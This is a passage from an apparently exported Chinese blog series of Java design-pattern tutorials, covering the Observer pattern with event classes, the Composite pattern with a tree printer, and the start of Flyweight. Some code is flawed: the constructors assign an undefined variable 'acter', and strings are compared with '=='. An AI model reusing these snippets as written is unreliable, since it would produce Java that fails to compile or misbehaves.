class="hljs-string">"ring..."</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">actionOnActing</span><span class="hljs-params">()</span> </span>&#123;<br>        ring();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Act</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Acter acter = <span class="hljs-keyword">new</span> Acter();<br>        System.out.println(acter.isAct());<br>        acter.Acting();<br>        System.out.println(acter.isAct());<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>接着，需求升级，我们知道当演员在出场时，观察者会有所动作。但根据实际情况分析，演员也是不同的，每个演员出场的音乐、灯光、和旁白都是不一样的。那这个时候，我们需要怎么办，要传参数了。</p>
<p>我们创建一个事件类,在调用观察者中的方法时，需要传入这个事件类，此时即可满足需求。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Acter</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> act = <span class="hljs-keyword">false</span>;<br>    List&lt;Observer&gt; observers = <span class="hljs-keyword">new</span> ArrayList&lt;Observer&gt;();<br>    &#123;<br>        observers.add(<span class="hljs-keyword">new</span> Light());<br>        observers.add(<span class="hljs-keyword">new</span> Music());<br>        observers.add(<span class="hljs-keyword">new</span> Narrator());<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isAct</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> act;<br>    &#125;<br><br>    actionEvent event = <span class="hljs-keyword">new</span> actionEvent(<span class="hljs-string">"男"</span>, <span class="hljs-string">"role1"</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">action</span><span class="hljs-params">()</span></span>&#123;<br>        act = <span class="hljs-keyword">true</span>;<br>        <span class="hljs-keyword">for</span> (Observer o : observers)&#123;<br>            System.out.println(event.gender);<br>            o.actionOnActing(event);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 事件类 </span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">actionEvent</span></span>&#123;<br>    String gender;<br>    String roleName;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">actionEvent</span><span class="hljs-params">(String gender, String roleName)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.gender = gender;<br>        <span class="hljs-keyword">this</span>.roleName = roleName;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Observer</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">actionOnActing</span><span class="hljs-params">(actionEvent event)</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Light</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Observer</span></span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">turnOn</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"TurnOn..."</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">turnOnBg1</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"turnOnBg1..."</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">actionOnActing</span><span class="hljs-params">(actionEvent event)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (event.roleName == <span class="hljs-string">"role1"</span>) turnOn();<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (event.roleName != <span class="hljs-string">"role1"</span>) turnOnBg1();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Music</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Observer</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sound</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"Sound..."</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">actionOnActing</span><span class="hljs-params">(actionEvent event)</span> </span>&#123;<br>        sound();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Narrator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Observer</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ring</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"Ring..."</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">actionOnActing</span><span class="hljs-params">(actionEvent event)</span> </span>&#123;<br>        ring();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Acter acter = <span class="hljs-keyword">new</span> Acter();<br>        System.out.println(acter.isAct());<br>        acter.action();<br>        System.out.println(acter.isAct());<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>但是其实在很多时候，观察者需要根据事件的具体情况来进行处理。大多数时候，我们处理事件的时候，需要事件源对象。观察者作出的反应，和事件源本身并不是完全耦合的紧密。</p>
<p>有人可能会说，当你new一个Observer把事件源传进去不就行了吗？<br>答案是不行的，此时就相当于将Observer和具体的事件源对象绑定了，那么就只能观察这一个事件源对象了<br>我们将actionEvent接口中，添加一个属性，当我们需要它的源对象的时候，getSource()即可<br>(这里微微感叹一下，这些人真聪明)</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Acter</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> act = <span class="hljs-keyword">false</span>;<br>    List&lt;Observer&gt; observers = <span class="hljs-keyword">new</span> ArrayList&lt;Observer&gt;();<br>    &#123;<br>        observers.add(<span class="hljs-keyword">new</span> Light());<br>        observers.add(<span class="hljs-keyword">new</span> Music());<br>        observers.add(<span class="hljs-keyword">new</span> Narrator());<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isAct</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> act;<br>    &#125;<br><br>    actionEvent event = <span class="hljs-keyword">new</span> actionEvent(<span class="hljs-string">"男"</span>, <span class="hljs-string">"role1"</span>, <span class="hljs-keyword">this</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">action</span><span class="hljs-params">()</span></span>&#123;<br>        act = <span class="hljs-keyword">true</span>;<br>        <span class="hljs-keyword">for</span> (Observer o : observers)&#123;<br>            System.out.println(event.gender);<br>            o.actionOnActing(event);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 事件类 </span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">actionEvent</span></span>&#123;<br>    String gender;<br>    String roleName;<br>    Acter source;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">actionEvent</span><span class="hljs-params">(String gender, String roleName, Acter source)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.gender = gender;<br>        <span class="hljs-keyword">this</span>.roleName = roleName;<br>        <span class="hljs-keyword">this</span>.source = acter;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Acter <span class="hljs-title">getSource</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> source;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Observer</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">actionOnActing</span><span class="hljs-params">(actionEvent event)</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Light</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Observer</span></span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">turnOn</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"TurnOn..."</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">turnOnBg1</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"turnOnBg1..."</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">actionOnActing</span><span class="hljs-params">(actionEvent event)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (event.roleName == <span class="hljs-string">"role1"</span>) turnOn();<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (event.roleName != <span class="hljs-string">"role1"</span>) turnOnBg1();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Music</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Observer</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sound</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"Sound..."</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">actionOnActing</span><span class="hljs-params">(actionEvent event)</span> </span>&#123;<br>        sound();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Narrator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Observer</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ring</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"Ring..."</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">actionOnActing</span><span class="hljs-params">(actionEvent event)</span> </span>&#123;<br>        ring();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Acter acter = <span class="hljs-keyword">new</span> Acter();<br>        System.out.println(acter.isAct());<br>        acter.action();<br>        System.out.println(acter.isAct());<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>到这里大致就差不多说清楚了，观察者模式比较重要，所以这里🔒得比较仔细。</p>
<p>最后再说一下<br>事件也可以形成体系，事件本身可以有很多很多的类型(通过implements、extends)，这就是体系。<br>拿上面的代码来讲，可以将 <code>actionEvent</code> 继承抽象类 <code>Event</code> ，抽象类中含有 <code>getSource()</code> 方法，此时 <code>actionEvent</code> 中就继承了此方法(形成体系，这里只是简单模拟一下)。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Event</span>&lt;<span class="hljs-title">T</span>&gt;</span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">abstract</span> T <span class="hljs-title">getSource</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 事件类 </span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">actionEvent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Event</span>&lt;<span class="hljs-title">Acter</span>&gt;</span>&#123;<br>    String gender;<br>    String roleName;<br>    Acter source;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">actionEvent</span><span class="hljs-params">(String gender, String roleName, Acter source)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.gender = gender;<br>        <span class="hljs-keyword">this</span>.roleName = roleName;<br>        <span class="hljs-keyword">this</span>.source = acter;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Acter <span class="hljs-title">getSource</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> source;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>在很多系统中，Observer模式往往和责任链共同负责对于事件的处理，其中的某一个observer负责是否将事件进一步传递。<br>下一篇介绍一下责任链模式</p>
]]></content>
      <categories>
        <category>程序猿</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式7-Composite</title>
    <url>/article/c8498abb.html</url>
    <content><![CDATA[<h2 id="组合模式"><a href="#组合模式" class="headerlink" title=" 组合模式"></a><a href="https://www.runoob.com/design-pattern/decorator-pattern.html" target="_blank" rel="noopener"> 组合模式</a></h2><p><font size="4" face="PingFang SC">&emsp;&emsp;组合模式（Composite Pattern），又叫 <font color="#FFB6C1" size="5" face="Open Sans"> 部分整体模式 </font>，是用于把一组相似的对象当作一个单一的对象。组合模式依据树形结构来组合对象，用来表示部分以及整体层次。这种类型的设计模式属于结构型模式，它创建了对象组的树形结构。</p>
<p>这种模式创建了一个包含自己对象组的类。该类提供了修改相同对象组的方式。</p>
<p>如果想了解组合模式的具体的介绍，菜鸟教程介绍得比较详细↓<br><a href="https://www.runoob.com/design-pattern/composite-pattern.html" target="_blank" rel="noopener" class="LinkCard">菜鸟教程-组合模式<br></a></p>
<h2 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h2><p><img src="https://qiniuyun.fxhstudy.com/Composite.png" srcset="/img/loading.gif" title="组合模式"><br></p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>优点：<br>1、高层模块调用简单。<br>2、节点自由增加。</p>
<p>缺点： 在使用组合模式时，其叶子和树枝的声明都是实现类，而不是接口，违反了依赖倒置原则。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>部分、整体场景，如树形菜单，文件、文件夹的管理。</p>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>组合模式是很简单的模式，这里就模拟一下树的结构</p>
<p>先创建一个 <code>Node</code> 抽象类,里面有一个抽象的打印方法。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Node</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">p</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>接着创建 <code>LeafNode</code> 类和 <code>BranchNode</code> 类来继承 <code>Node</code> 抽象类。</p>
<p><code>LeafNode</code> 表示叶子节点，<code>BranchNode</code> 表示存在子节点的节点。</p>
<p><code>LeafNode</code> 和 <code>BranchNode</code> 中都定义一个content，用来输出时表示这个节点是什么，<br>其中 <code>BranchNode</code> 中还定义了一个 <code>List</code> 类型的 <code>nodes</code> 用来存储 <code>BranchNode</code> 下面的节点。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LeafNode</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Node</span> </span>&#123;<br>    String content;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">LeafNode</span><span class="hljs-params">(String content)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.content = content;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">p</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(content);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BranchNode</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Node</span> </span>&#123;<br>    List&lt;Node&gt; nodes = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>    String content;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BranchNode</span><span class="hljs-params">(String content)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.content = content;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">p</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(content);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Node node)</span> </span>&#123;<br>        nodes.add(node);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>最后就是写出主函数，我们创建一个根结点，然后根节点下面存在很多其他的子节点和叶子节点,<br>最后，用递归的方式完成输出:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        BranchNode root = <span class="hljs-keyword">new</span> BranchNode(<span class="hljs-string">"root"</span>);<br>        BranchNode chapter1 = <span class="hljs-keyword">new</span> BranchNode(<span class="hljs-string">"chapter1"</span>);<br>        BranchNode chapter2 = <span class="hljs-keyword">new</span> BranchNode(<span class="hljs-string">"chapter2"</span>);<br>        Node c11 = <span class="hljs-keyword">new</span> LeafNode(<span class="hljs-string">"c11"</span>);<br>        Node c12 = <span class="hljs-keyword">new</span> LeafNode(<span class="hljs-string">"c12"</span>);<br>        BranchNode b21 = <span class="hljs-keyword">new</span> BranchNode(<span class="hljs-string">"section21"</span>);<br>        Node c211 = <span class="hljs-keyword">new</span> LeafNode(<span class="hljs-string">"c211"</span>);<br>        Node c212 = <span class="hljs-keyword">new</span> LeafNode(<span class="hljs-string">"c212"</span>);<br><br>        root.add(chapter1);<br>        root.add(chapter2);<br>        chapter1.add(c11);<br>        chapter1.add(c12);<br>        chapter2.add(b21);<br>        b21.add(c211);<br>        b21.add(c212);<br><br>        tree(root, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">tree</span><span class="hljs-params">(Node b, <span class="hljs-keyword">int</span> depth)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; depth; i++)<br>            System.out.print(<span class="hljs-string">"--"</span>);<br>        b.p();<br><br>        <span class="hljs-keyword">if</span> (b <span class="hljs-keyword">instanceof</span> BranchNode) &#123;<br>            <span class="hljs-keyword">for</span> (Node n :<br>                    ((BranchNode) b).nodes) &#123;<br>                tree(n, depth + <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>输出结果:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">root<br>--chapter1<br>----c11<br>----c12<br>--chapter2<br>----section21<br>------c211<br>------c212<br></code></pre></div></td></tr></table></figure>

</font>]]></content>
      <categories>
        <category>程序猿</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式8-Flyweight</title>
    <url>/article/e2704b4b.html</url>
    <content><![CDATA[<p><font size="4" face="PingFang SC">&emsp;&emsp;享元模式（Flyweight Pattern）主要用于减少创建对象的数量，以减少内存占用和提高性能。这种类型的设计模式属于<font color="#FFB6C1" size="5" face="Open Sans"> 结构型模式 </font>，它提供了减少对象数量从而改善应用所需的对象结构的方式。</p>
<p>享元模式尝试重用现有的同类对象，如果未找到匹配的对象，则创建新对象。</p>
<p>如果想了解享元模式的具体的介绍，菜鸟教程介绍得比较详细↓<br><a href="https://www.runoob.com/design-pattern/flyweight-pattern.html" target="_blank" rel="noopener" class="LinkCard">菜鸟教程-享元模式<br></a></p>
<h2 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h2><p><img src="https://qiniuyun.fxhstudy.com/Flyweight.png" srcset="/img/loading.gif" title="享元模式"><br></p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>优点： 大大减少对象的创建，降低系统的内存，使效率提高。</p>
<p>缺点： 提高了系统的复杂度，需要分离出外部状态和内部状态，而且外部状态具有固有化的性质，不应该随着内部状态的变化而变化，否则会造成系统的混乱。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p> 1、系统有大量相似对象。<br> 2、需要缓冲池的场景。</p>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>享元模式比较简单，就是重复利用对象，是一种”池”的思想。</p>
<p>这里我就直接介绍一下java中的享元模式。</p>
